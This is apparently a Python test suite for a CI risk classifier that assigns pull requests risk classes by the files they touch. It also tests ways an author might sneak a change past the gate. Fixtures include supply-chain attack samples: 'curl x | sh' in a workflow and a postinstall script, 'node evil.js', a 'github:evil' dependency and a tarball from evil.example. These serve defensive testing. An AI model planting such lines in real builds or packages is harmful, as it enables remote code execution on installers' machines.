"""Cases for risk_class.py: one per row of the table, plus the ways an author could lower a class.

Offline cases go through `--facts`; the API cases through the fake `gh`, so the collector (files
paginated, renames, package.json blobs, errors) is tested too.
"""
import json
import os
import subprocess
import sys
import tempfile
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "merge-when-green", "testlib"))
import harness as H  # noqa: E402

S = H.Suite("risk-class")
SCRIPT = "risk-class/risk-class.sh"
RENOVATE = "renovate[bot]"
PKG_BASE = {"name": "x", "version": "1.0.0", "scripts": {"test": "vitest"},
            "dependencies": {"globals": "^17.0.0"}, "devDependencies": {"vitest": "^4.1.0"}}


def pkg(**changes):
    d = json.loads(json.dumps(PKG_BASE))
    for k, v in changes.items():
        if v is None:
            d.pop(k, None)
        else:
            d[k] = v
    return json.dumps(d, indent=2)


def F(path, status="modified", lines=6, prev=None, patch="@@ -1 +1 @@\n-a\n+b"):
    return {"filename": path, "status": status, "additions": lines - lines // 2, "deletions": lines // 2,
            "previous_filename": prev, "patch": patch}


def facts(files, labels=("semver:patch",), author="dev", base="develop", head="feat/x", body="", commits=None,
          blobs=None, policy=None, config=None):
    files = [F(f) if isinstance(f, str) else f for f in files]
    if blobs is None:
        blobs = {f["filename"]: {"base": pkg(), "head": pkg(dependencies={"globals": "^17.1.0"})}
                 for f in files if f["filename"].endswith("package.json")}
    d = {"files": files, "labels": list(labels), "author": author, "base_ref": base, "head_ref": head,
         "body": body, "blobs": blobs,
         "policy": policy if policy is not None else {"protected_branch": "main", "integration_branch": "develop"},
         "config": config or {}}
    if commits is not None:
        d["commits"] = commits
    elif author == RENOVATE:
        d["commits"] = [{"author": RENOVATE, "committer": "web-flow", "verified": True}]
    return d


def classify(fx, extra=()):
    fd, path = tempfile.mkstemp(suffix=".json")
    with os.fdopen(fd, "w") as fh:
        json.dump(fx, fh)
    res = H.run_script(SCRIPT, ["--facts", path, "--json"] + list(extra), H.World())
    os.unlink(path)
    if res["rc"] != 0:
        return {"class": "exit %d" % res["rc"], "err": res["err"]}
    return json.loads(res["out"])


def case(label, fx, want, extra=(), key="class"):
    out = classify(fx, extra)
    S.check("%s -> %s" % (label, want), out.get(key) == want,
            "got %s; reasons %s" % (out.get(key), [(r["class"], r["rule"]) for r in out.get("reasons", [])] or out))
    return out


ZERO = {"renovate_minor_class": 0}
PIN = ("@@ -10,3 +10,3 @@\n     steps:\n-      - uses: actions/checkout@aaaa # v6.0.0\n"
       "+      - uses: actions/checkout@bbbb # v6.0.1\n")
LOCK_OK = "@@ -1,3 +1,3 @@\n-    resolution: {integrity: sha512-a}\n+    resolution: {integrity: sha512-b}\n"

# ── the table ─────────────────────────────────────────────────────────────────────────────────────
case("1 docs/a.md", facts(["docs/a.md"]), 0)
case("2 README.md", facts(["README.md"]), 0)
case("3 openspec change", facts(["openspec/changes/x/tasks.md"]), 0)
case("4 tests added", facts([F("src/a.test.ts", "added"), F("tests/b.py", "added"), F("fixtures/c.json", "added")]), 0)
case("4b existing tests edited", facts([F("src/a.test.ts"), F("tests/b.py")]), 1)
case("5 test removed", facts([F("src/a.test.ts", "removed")]), 1)
case("6 src 50 lines patch", facts([F("src/x.ts", lines=50)]), 1)
case("7 src 250 lines", facts([F("src/x.ts", lines=250)]), 2)
case("7b src exactly 200 lines", facts([F("src/x.ts", lines=200)]), 1)
case("7c 201 lines over two files", facts([F("src/x.ts", lines=101), F("src/y.ts", lines=100)]), 2)
case("8 src 20 lines semver:minor", facts([F("src/x.ts", lines=20)], labels=["semver:minor"]), 2)
case("9 CLAUDE.md nested", facts(["CLAUDE.md", "pkg/CLAUDE.md"]), 2)
case("10 .claude/rules", facts([".claude/rules/a.md"]), 2)
case("11 .claude/settings.json", facts([".claude/settings.json"]), 3)
case("12 .claude/hooks", facts([".claude/hooks/x.sh"]), 3)
case("13 plugin skill", facts(["plugins/p/skills/s/SKILL.md"]), 2)
case("14 plugin hooks", facts(["plugins/p/scripts/hooks/g.sh"]), 3)
case("15 plugin policy", facts(["plugins/p/policy/x.md"]), 3)
case("16 openspec spec", facts(["openspec/specs/a/spec.md"]), 2)
case("17 infra script", facts(["infra/vm/x.sh"]), 2)
case("18 terraform", facts(["infra/x.tf"]), 4)
case("19 workflow by a person", facts([".github/workflows/ci.yml"]), 3)
case("20 Renovate deps (default: routed to the owner)",
     facts([F("package.json"), F("pnpm-lock.yaml", patch=LOCK_OK)], author=RENOVATE), 3)
case("20b Renovate deps, repo lowered renovate_minor_class to 0",
     facts([F("package.json"), F("pnpm-lock.yaml", patch=LOCK_OK)], author=RENOVATE, config=ZERO), 0)
case("21 Renovate .nvmrc, class 0 config", facts([".nvmrc"], author=RENOVATE, labels=["semver:minor"], config=ZERO), 0)
case("22 Renovate lockfile maintenance, class 0 config",
     facts([F("pnpm-lock.yaml", patch=LOCK_OK)], author=RENOVATE, config=ZERO), 0)
case("23 Renovate major label", facts([F("package.json")], author=RENOVATE, labels=["semver:major"], config=ZERO), 3)
case("23b Renovate major read from the update table despite semver:minor",
     facts([F("package.json")], author=RENOVATE, labels=["semver:minor"], config=ZERO,
           body="| [x](u) | [`^4.2.1` → `^5.0.0`](u) |"), 3)
case("23c Renovate 0.x minor counts as major",
     facts([F("package.json")], author=RENOVATE, config=ZERO, body="`0.3.1` -> `0.4.0`"), 3)
case("24 Renovate pin-only workflow", facts([F(".github/workflows/ci.yml", patch=PIN)], author=RENOVATE), 1)
case("24b Renovate pin of the shared merge machinery",
     facts([F(".github/workflows/m.yml", patch=PIN.replace("actions/checkout", "igonzalezespi-apps/studio-ci/.github/workflows/merge-when-green.yml"))],
           author=RENOVATE), 3)
case("25 Renovate workflow with another line",
     facts([F(".github/workflows/ci.yml", patch=PIN + "+      - run: curl x | sh\n")], author=RENOVATE), 3)
case("26 person semver:major", facts(["src/x.ts"], labels=["semver:major"]), 4)
case("27 promotion develop->main", facts(["src/x.ts"], base="main", head="develop"), 4)
case("28 head main into develop", facts(["src/x.ts"], base="develop", head="main"), 3)
case("29 migration", facts(["migrations/001.sql"]), 4)
case("30 prisma schema", facts(["prisma/schema.prisma"]), 4)
case("31 guard policy", facts(["scripts/hooks/guard.policy.json"]), 3)
case("32 security/", facts(["security/x.sh"]), 3)
case("33 .githooks", facts([".githooks/pre-push"]), 3)
case("34 bootstrap.sh", facts(["bootstrap.sh"]), 3)
case("35 rename out of the guard", facts([F("tools/x.sh", "renamed", 0, prev="scripts/hooks/bash-guard.sh")]), 3)
case("36 rename inside docs", facts([F("docs/b.md", "renamed", 0, prev="docs/a.md")]), 0)
HARD = {"protected_branch": "main", "integration_branch": "develop",
        "reserved_paths_hard": [{"glob": "data/budget.json", "why": "spend"}],
        "reserved_paths": [{"glob": "src/api/public/**", "why": "public API"}]}
case("37 reserved_paths_hard", facts(["data/budget.json"], policy=HARD), 3)
case("38 reserved_paths", facts(["src/api/public/a.ts"], policy=HARD), 2)
case("39 risk_paths raises", facts(["base.mjs"], config={"risk_paths": [{"glob": "*.mjs", "class": 2}]}), 2)
case("40 risk_paths cannot lower", facts(["CLAUDE.md"], config={"risk_paths": [{"glob": "CLAUDE.md", "class": 0}]}), 2)
case("41 the merge config", facts([".github/merge-when-green.json"]), 3)
case("42 LICENSE", facts(["LICENSE"]), 3)
case("43 key material", facts(["certs/key.pem", ".env"]), 4)
case("44 no files", facts([]), 0)
case("45 lockfile by a person", facts([F("pnpm-lock.yaml", patch=LOCK_OK)]), 2)
case("46 package.json by a person", facts(["package.json"]), 2)
case("46b package.json lifecycle script", facts(["package.json"], blobs={"package.json": {
    "base": pkg(), "head": pkg(scripts={"test": "vitest", "postinstall": "node x.js"})}}), 3)
case("46c package.json pnpm overrides", facts(["package.json"], blobs={"package.json": {
    "base": pkg(), "head": pkg(pnpm={"overrides": {"a": "1"}})}}), 3)
case("46d package.json not inspected", facts(["package.json"], blobs={}), 3)
case("47 an action's interface", facts(["x/action.yml"]), 2)
case("48 --min 3", facts(["docs/a.md"]), 3, extra=["--min", "3", "--min-reason", "important check"])
case("49 docs + 10 lines of code", facts(["docs/a.md", F("src/x.ts", lines=10)]), 1)
case("50 .github config", facts([".github/context-budget.json"]), 2)
case("51 Dockerfile", facts(["Dockerfile"]), 2)
case("52 runbook", facts(["docs/runbook-x.md"]), 2)

# ── the objections: ways an author lowers a class, and the gate protecting itself ─────────────────
EXPORTS = {"risk_paths": [{"glob": "*.mjs", "class": 2, "why": "exported configs"}]}
case("O2 Renovate dependency bump in an exports repo, default config",
     facts([F("package.json"), F("pnpm-lock.yaml", patch=LOCK_OK)], author=RENOVATE, config=EXPORTS), 3)
case("O5 someone else's commit on the Renovate branch",
     facts([F("pnpm-lock.yaml", patch=LOCK_OK)], author=RENOVATE, config=ZERO,
           commits=[{"author": RENOVATE, "committer": "web-flow", "verified": True},
                    {"author": "dev", "committer": "dev", "verified": False}]), 2)
case("O5b unverified web-flow commit on the Renovate branch",
     facts([F("pnpm-lock.yaml", patch=LOCK_OK)], author=RENOVATE, config=ZERO,
           commits=[{"author": RENOVATE, "committer": "web-flow", "verified": False}]), 2)
case("O5c Renovate package.json adds a postinstall", facts([F("package.json")], author=RENOVATE, config=ZERO, blobs={
    "package.json": {"base": pkg(), "head": pkg(scripts={"test": "vitest", "postinstall": "curl x|sh"})}}), 3)
case("O5d Renovate package.json changes a non-dependency key", facts([F("package.json")], author=RENOVATE, config=ZERO,
     blobs={"package.json": {"base": pkg(), "head": pkg(main="evil.js")}}), 2)
case("O5e Renovate dependency from git", facts([F("package.json")], author=RENOVATE, config=ZERO, blobs={
    "package.json": {"base": pkg(), "head": pkg(dependencies={"globals": "github:evil/globals"})}}), 2)
case("O5f Renovate lockfile pulls from another host", facts([F("pnpm-lock.yaml", patch=LOCK_OK +
     "+    resolution: {tarball: https://evil.example/x.tgz}\n")], author=RENOVATE, config=ZERO), 2)
case("O5g Renovate lockfile without a patch (too big to audit)",
     facts([F("pnpm-lock.yaml", patch=None)], author=RENOVATE, config=ZERO), 2)
case("O5h semver:patch does not lower a 250-line change", facts([F("src/x.ts", lines=250)], labels=["semver:patch"]), 2)
case("O7a tsconfig", facts(["tsconfig.json"]), 2)
case("O7b vitest config", facts(["vitest.config.ts"]), 2)
case("O7c eslint config", facts(["eslint.config.mjs"]), 2)
case("O7d .npmrc", facts([".npmrc"]), 3)
case("O7e pnpm-workspace.yaml", facts(["pnpm-workspace.yaml"]), 3)
case("O7f a script under docs/ is code", facts(["docs/x.sh"]), 1)
case("O7g renamed test without changes", facts([F("tests/b.py", "renamed", 0, prev="tests/a.py")]), 0)
case("O4a the classifier itself", facts(["risk-class/risk_class.py"]), 3)
case("O4b the TL;DR check", facts(["check-pr-tldr/check.sh"]), 3)
case("O4c the merge gate scripts", facts(["merge-when-green/pr_merge.py"]), 3)
case("PR template", facts([".github/PULL_REQUEST_TEMPLATE.md"]), 0)
out = case("missing semver does not change the class", facts(["docs/a.md"], labels=[]), 0)
S.check("missing semver is reported", out.get("missing_semver") is True)
out = case("two semver labels", facts(["docs/a.md"], labels=["semver:none", "semver:patch"]), 0)
S.check("two semver labels are reported", out.get("missing_semver") is True)
out = case("Renovate automerge is detected", facts([".nvmrc"], author=RENOVATE, config=ZERO,
           body="🚦 **Automerge**: Enabled."), 0)
S.check("renovate_automerge true", out.get("renovate_automerge") is True)
out = case("reasons name the highest rule first", facts(["docs/a.md", "infra/x.tf"]), 4)
S.check("first reason is class 4", (out.get("reasons") or [{}])[0].get("class") == 4)

# ── API mode, through the fake gh ─────────────────────────────────────────────────────────────────
w = H.World()
w.policy()
w.pull(7)
w.files(7, [{"filename": "tools/x.sh", "previous_filename": "scripts/hooks/bash-guard.sh", "status": "renamed",
             "additions": 0, "deletions": 0}])
res = H.run_script(SCRIPT, ["--pr", "7", "--repo", H.REPO, "--json"], w)
S.check("API: a rename out of the guard is 3", res["rc"] == 0 and json.loads(res["out"] or "{}").get("class") == 3,
        res["err"] or res["out"])
S.check("API: files are read paginated", any(c["path"] == "repos/%s/pulls/7/files?per_page=100" % H.REPO for c in res["calls"]))
S.check("API: read-only (no write call)", not H.writes(res))

w = H.World()
w.policy(reserved_paths_hard=[{"glob": "data/**", "why": "x"}])
p = w.pull(8)
w.files(8, ["data/a.json"])
res = H.run_script(SCRIPT, ["--pr", "8", "--repo", H.REPO, "--json"], w)
S.check("API: reserved_paths_hard read from the default branch", json.loads(res["out"] or "{}").get("class") == 3, res["err"])

w = H.World()
w.policy()
p = w.pull(9)
w.files(9, ["package.json"])
w.file("package.json", pkg(), ref=p["base"]["sha"])
w.file("package.json", pkg(scripts={"test": "vitest", "prepare": "node evil.js"}), ref=p["head"]["sha"])
res = H.run_script(SCRIPT, ["--pr", "9", "--repo", H.REPO, "--json"], w)
S.check("API: package.json blobs compared base vs head", json.loads(res["out"] or "{}").get("class") == 3, res["err"])

w = H.World()
w.policy()
w.pull(10)
w.routes["GET repos/%s/pulls/10/files?per_page=100" % H.REPO] = {"status": 502, "body": {"message": "Bad Gateway"}}
res = H.run_script(SCRIPT, ["--pr", "10", "--repo", H.REPO, "--json"], w)
S.check("53 API error -> exit 2", res["rc"] == 2, res)

w = H.World()
w.policy()
p = w.pull(11)
p["changed_files"] = 3001
w.r("GET", "repos/%s/pulls/11" % H.REPO, p)
res = H.run_script(SCRIPT, ["--pr", "11", "--repo", H.REPO, "--json"], w)
S.check("55 3001 files -> exit 2", res["rc"] == 2, res)

t0 = time.time()
p = subprocess.run(["timeout", "5", os.path.join(H.ROOT, SCRIPT), "--pr", "5", "--repo"], capture_output=True, text=True)
S.check("54 --repo without a value -> exit 2 at once", p.returncode == 2 and time.time() - t0 < 5, p.returncode)
p = subprocess.run(["timeout", "5", os.path.join(H.ROOT, SCRIPT), "--pr", "5", "--repo", "a b"], capture_output=True, text=True)
S.check("--repo that is not owner/name -> exit 2", p.returncode == 2)


# ── git mode (pr-body uses it) and the text rendering ───────────────────────────────────────────
import shutil  # noqa: E402
g = tempfile.mkdtemp()
def git(*a):
    subprocess.run(["git", "-C", g] + list(a), check=True, capture_output=True,
                   env=dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@x", GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@x"))
git("init", "-q", "-b", "develop")
os.makedirs(os.path.join(g, "scripts", "hooks")); os.makedirs(os.path.join(g, "docs"))
open(os.path.join(g, "scripts", "hooks", "bash-guard.sh"), "w").write("echo guard\n" * 20)
open(os.path.join(g, "docs", "a.md"), "w").write("doc\n")
open(os.path.join(g, "package.json"), "w").write(pkg())
git("add", "-A"); git("commit", "-qm", "base")
git("checkout", "-qb", "feat/x")
os.makedirs(os.path.join(g, "tools")); git("mv", "scripts/hooks/bash-guard.sh", "tools/x.sh")
open(os.path.join(g, "docs", "a.md"), "a").write("more\n")
git("add", "-A"); git("commit", "-qm", "change")
res = H.run_script(SCRIPT, ["--git", "--base", "develop", "--repo-dir", g, "--labels", "semver:patch", "--json"], H.World())
out = json.loads(res["out"] or "{}")
S.check("git mode: a rename out of the guard is 3", out.get("class") == 3, res["err"] or out)
git("checkout", "-q", "develop"); git("checkout", "-qb", "feat/y")
open(os.path.join(g, "package.json"), "w").write(pkg(scripts={"test": "vitest", "postinstall": "x"}))
git("add", "-A"); git("commit", "-qm", "pkg")
res = H.run_script(SCRIPT, ["--git", "--base", "develop", "--repo-dir", g, "--json"], H.World())
S.check("git mode: package.json blobs compared from git", json.loads(res["out"] or "{}").get("class") == 3, res["err"])
res = H.run_script(SCRIPT, ["--git", "--base", "develop", "--repo-dir", g], H.World())
S.check("text output names the class and the rule", res["rc"] == 0 and res["out"].startswith("riesgo:3") and "install-surface" in res["out"]
        and "not exactly one semver" in res["out"], res["out"])
shutil.rmtree(g, ignore_errors=True)

sys.exit(S.done())
